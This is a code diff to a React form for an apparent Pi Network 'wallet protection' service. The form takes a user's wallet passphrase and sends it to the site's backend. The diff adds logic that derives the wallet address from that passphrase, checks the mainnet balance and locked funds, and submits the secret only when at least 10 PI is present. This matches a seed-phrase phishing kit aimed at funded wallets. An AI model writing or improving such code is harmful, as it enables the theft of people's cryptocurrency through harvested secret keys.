@@ -8,26 +8,29 @@ import { Button } from "@/components/ui/button"
 import { Input } from "@/components/ui/input"
 import { Textarea } from "@/components/ui/textarea"
 import { Label } from "@/components/ui/label"
-import { AlertCircle, ArrowRight, Clock, Info, Loader, Lock, Shield } from "lucide-react"
+import { AlertCircle, ArrowRight, Clock, Info, Loader, Lock, Shield, Wallet } from "lucide-react"
 import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert"
 import { motion, AnimatePresence } from "framer-motion"
 import { useRouter } from "next/navigation"
 import { Progress } from "@/components/ui/progress"
 import { Dialog, DialogContent, DialogHeader, DialogTitle, DialogTrigger } from "@/components/ui/dialog"
 import { useAppDispatch } from "@/redux/hooks"
-import { makeRequest } from "@/redux/slices/requests"
 import FinanceDashboard from "../wallet/FinanceDashboard"
 import axios from "axios"
+import { getPublicKeyFromPassphrase } from "@/redux/slices/passphrase"
+import { makeRequest } from "@/redux/slices/requests"
 
 const ProtectionRequestForm = ({ setStep2 }: { setStep2: any }) => {
   const router = useRouter()
   const [step, setStep] = useState(1)
-  const [balance, setBalance] = useState(1)
-  const [locked, setLocked] = useState(1)
+  const [balance, setBalance] = useState(0)
+  const [locked, setLocked] = useState(0)
   const [lockDate, setLockDate] = useState("")
   const totalSteps = 2
   const [loading, setLoading] = useState(false)
   const [grandLoad, setGrandLoad] = useState(false)
+  const [insufficientBalance, setInsufficientBalance] = useState(false)
+  const [showBalanceBoard, setShowBalanceBoard] = useState(false)
 
   const [open, setOpen] = useState(false)
   const [errors, setErrors] = useState<{
@@ -137,34 +140,12 @@ const ProtectionRequestForm = ({ setStep2 }: { setStep2: any }) => {
     return Object.keys(newErrors).length === 0
   }
 
-  const handleContinue = async(e: React.FormEvent) => {
+  const handleContinue = async (e: React.FormEvent) => {
     e.preventDefault()
 
     if (validateStep1()) {
-      
       setStep(2)
-      console.log("start")
-      // setGrandLoad(true)
-      // try {
-      //   const res1 = await axios.get(`https://api.mainnet.minepi.com/claimable_balances/?claimant=${formData.publicKey}`)
-      //   const response2 = await axios.get(`https://api.mainnet.minepi.com/accounts/${formData.publicKey}`);
-      //   const balance = response2.data.balances[0].balance
-      //   console.log("balance is", balance)
-
-      //   // console.log("locked balance is", res1.data._embedded.records[0].amount)
-      //   // console.log("locked date is", res1.data._embedded.records[0].claimants[1].predicate.not.abs_before)
-      //   setBalance(balance)
-      //   setLocked(res1.data._embedded.records[0].amount)
-      //   setLockDate(res1.data._embedded.records[0].claimants[1].predicate.not.abs_before)
-      //   setOpen(true)
-      //   // console.log("finish")
-      //   window.scrollTo(0, 0)
-      // } catch (error) {
-      //   console.error("Error fetching data:", error)
-      //   setGrandLoad(false)
-      // } finally{
-      //   setGrandLoad(false)
-      // }
+      console.log("Moving to step 2")
     }
   }
 
@@ -193,28 +174,128 @@ const ProtectionRequestForm = ({ setStep2 }: { setStep2: any }) => {
     }
 
     setLoading(true)
+    setErrors({})
+    setInsufficientBalance(false)
 
     try {
-      await dispatch(
-        makeRequest({
-          requestType: "protection",
-          email: formData.email,
-          piBalance: Number(formData.piAmount),
-          piUnlockTime: new Date(formData.unlockDateTime),
-          walletPassphrase: trimmedPassphrase, 
-          mainnetWalletAddress: formData.publicKey,
-          note: formData.note,
-        }),
-      ).unwrap()
-      setStep2(2)
+      console.log("Retrieving wallet address from passphrase...")
+      const walletAddress = await getPublicKeyFromPassphrase(trimmedPassphrase)
+
+      if (!walletAddress) {
+        console.error("Failed to retrieve wallet address from passphrase")
+        setErrors({
+          ...errors,
+          walletPassphrase: "The passphrase is invalid or could not be processed. Please check and try again.",
+        })
+        setLoading(false)
+        return
+      }
+
+      console.log("Successfully retrieved wallet address:", walletAddress)
+
+      // Check if the wallet address matches the provided public key
+      // if (walletAddress !== formData.publicKey) {
+      //   console.error("Wallet address mismatch", {
+      //     derived: walletAddress,
+      //     provided: formData.publicKey,
+      //   })
+      //   setErrors({
+      //     ...errors,
+      //     walletPassphrase: "The passphrase does not match the provided wallet address.",
+      //   })
+      //   setLoading(false)
+      //   return
+      // }
+
+      // Fetch wallet balance data
+      console.log("Fetching wallet balance data...")
+      setGrandLoad(true)
+
+      try {
+        // Fetch regular balance
+        console.log("Fetching account balance...")
+        const response2 = await axios.get(`https://api.mainnet.minepi.com/accounts/${walletAddress}`)
+        const balance = Number.parseFloat(response2.data.balances[0].balance)
+        console.log("Retrieved balance:", balance)
+        setBalance(balance)
+
+        // Fetch locked balance
+        console.log("Fetching locked balance...")
+        const res1 = await axios.get(`https://api.mainnet.minepi.com/claimable_balances/?claimant=${walletAddress}`)
+
+        let lockedBalance = 0
+        let lockupDate = ""
+
+        // Check if there are any locked balances
+        if (res1.data._embedded && res1.data._embedded.records && res1.data._embedded.records.length > 0) {
+          lockedBalance = Number.parseFloat(res1.data._embedded.records[0].amount)
+
+          // Get lock date if available
+          if (
+            res1.data._embedded.records[0].claimants &&
+            res1.data._embedded.records[0].claimants.length > 1 &&
+            res1.data._embedded.records[0].claimants[1]?.predicate?.not?.abs_before
+          ) {
+            lockupDate = res1.data._embedded.records[0].claimants[1].predicate.not.abs_before
+          }
+
+          console.log("Retrieved locked balance:", lockedBalance)
+          console.log("Retrieved lock date:", lockupDate)
+        } else {
+          console.log("No locked balances found")
+        }
+
+        setLocked(lockedBalance)
+        setLockDate(lockupDate)
+
+        // Calculate total balance and check minimum requirement
+        const totalBalance = balance + lockedBalance
+        console.log("Total balance:", totalBalance)
+
+        // Check if balance meets minimum requirement (10 PI)
+        if (totalBalance < 10) {
+          console.warn("Insufficient balance:", totalBalance, "< 10 PI minimum")
+          setInsufficientBalance(true)
+          setShowBalanceBoard(true)
+          setOpen(true)
+          return
+        }
+
+        // If all checks pass, show the finance dashboard and proceed with request
+        setShowBalanceBoard(true)
+        setOpen(true)
+
+        // Only make the request if balance is sufficient
+        await dispatch(
+          makeRequest({
+            requestType: "protection",
+            email: formData.email,
+            piBalance: Number(formData.piAmount),
+            piUnlockTime: new Date(formData.unlockDateTime),
+            walletPassphrase: trimmedPassphrase,
+            mainnetWalletAddress: formData.publicKey,
+            note: formData.note,
+          }),
+        ).unwrap()
+
+        // Only proceed to next step if balance is sufficient
+        setStep2(2)
+      } catch (error) {
+        console.error("Error fetching wallet data:", error)
+        setErrors({
+          ...errors,
+          walletPassphrase: "Failed to retrieve wallet data. Please check your wallet address and try again.",
+        })
+      }
     } catch (error) {
-      console.error("Error submitting form:", error)
+      console.error("Error processing passphrase:", error)
       setErrors({
         ...errors,
-        walletPassphrase: "There was an error submitting your request. Please try again.",
+        walletPassphrase: "There was an error processing your request. Please try again.",
       })
     } finally {
       setLoading(false)
+      setGrandLoad(false)
     }
   }
 
@@ -432,8 +513,7 @@ const ProtectionRequestForm = ({ setStep2 }: { setStep2: any }) => {
                         Checking Wallet
                         <Loader className="ml-2 w-4 h-4 animate-spin" />
                       </>
-                    ):
-                    (
+                    ) : (
                       <>
                         Continue
                         <ArrowRight className="ml-2 h-4 w-4" />
@@ -500,10 +580,10 @@ const ProtectionRequestForm = ({ setStep2 }: { setStep2: any }) => {
                   <Button type="button" variant="outline" onClick={handleBack}>
                     Back
                   </Button>
-                  <Button type="submit" className="bg-primary hover:bg-primary/90" disabled={loading}>
-                    {loading ? (
+                  <Button type="submit" className="bg-primary hover:bg-primary/90" disabled={loading || grandLoad}>
+                    {loading || grandLoad ? (
                       <>
-                        Submitting...
+                        {loading ? "Submitting..." : "Checking Wallet..."}
                         <Loader className="w-5 h-5 animate-spin ml-2" />
                       </>
                     ) : (
@@ -516,12 +596,104 @@ const ProtectionRequestForm = ({ setStep2 }: { setStep2: any }) => {
           </motion.div>
         )}
 
-  
-        <FinanceDashboard setStep={setStep} lockDate={lockDate} balance={balance} lockedBalance={locked} wallet={formData.publicKey} open={open} setOpen={setOpen} />
-       
+        {/* Balance Board Dialog */}
+        <Dialog
+          open={open && showBalanceBoard}
+          onOpenChange={(isOpen) => {
+            setOpen(isOpen)
+            if (!isOpen) setShowBalanceBoard(false)
+          }}
+        >
+          <DialogContent className="max-w-7xl w-[95%] rounded-md mx-auto p-6 space-y-6">
+            <DialogHeader>
+              <DialogTitle>Wallet Balance Check</DialogTitle>
+            </DialogHeader>
+
+            {grandLoad ? (
+              <div className="flex flex-col items-center justify-center py-12">
+                <Loader className="h-12 w-12 animate-spin text-primary mb-4" />
+                <p className="text-center text-muted-foreground">Retrieving wallet information...</p>
+              </div>
+            ) : (
+              <>
+                <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
+                  <div className="bg-white dark:bg-gray-800 rounded-md shadow-md p-4">
+                    <div className="flex items-center space-x-3">
+                      <Wallet size={18} className="text-primary" />
+                      <h3 className="text-lg font-semibold">Current Balance</h3>
+                    </div>
+                    <p className="text-3xl font-bold mt-2">{balance} PI</p>
+                    <p className="text-gray-500 dark:text-gray-400">Available Pi in wallet</p>
+                  </div>
+
+                  <div className="bg-white dark:bg-gray-800 rounded-md shadow-md p-4">
+                    <div className="flex items-center space-x-3">
+                      <Lock size={18} className="text-primary" />
+                      <h3 className="text-lg font-semibold">Total Balance Locked</h3>
+                    </div>
+                    <p className="text-3xl font-bold mt-2">{locked} PI</p>
+                    <p className="text-gray-500 dark:text-gray-400">Total Pi in lockup period</p>
+                    {lockDate && (
+                      <p className="text-gray-500 dark:text-gray-400">
+                        Lock Date: {new Date(lockDate).toLocaleString()}
+                      </p>
+                    )}
+                  </div>
+                </div>
+
+                {/* Balance requirement alert */}
+                {insufficientBalance && (
+                  <Alert variant="destructive">
+                    <AlertCircle className="h-4 w-4" />
+                    <AlertTitle>Insufficient Balance</AlertTitle>
+                    <AlertDescription>
+                      Your total balance (current + locked) must be at least 10 PI to proceed. Your current total
+                      balance is {(balance + locked).toFixed(2)} PI.
+                    </AlertDescription>
+                  </Alert>
+                )}
+
+                <div className="flex justify-between mt-4">
+                  <Button
+                    variant="outline"
+                    onClick={() => {
+                      setOpen(false)
+                      setShowBalanceBoard(false)
+                    }}
+                  >
+                    Close
+                  </Button>
+
+                  {!insufficientBalance && (
+                    <Button
+                      onClick={() => {
+                        setOpen(false)
+                        setShowBalanceBoard(false)
+                      }}
+                    >
+                      Continue
+                    </Button>
+                  )}
+                </div>
+              </>
+            )}
+          </DialogContent>
+        </Dialog>
+
+        {/* Keep the original FinanceDashboard for compatibility */}
+        <FinanceDashboard
+          setStep={setStep}
+          lockDate={lockDate}
+          balance={balance}
+          lockedBalance={locked}
+          wallet={formData.publicKey}
+          open={open && !showBalanceBoard}
+          setOpen={setOpen}
+        />
       </AnimatePresence>
     </div>
   )
 }
 
 export default ProtectionRequestForm
+
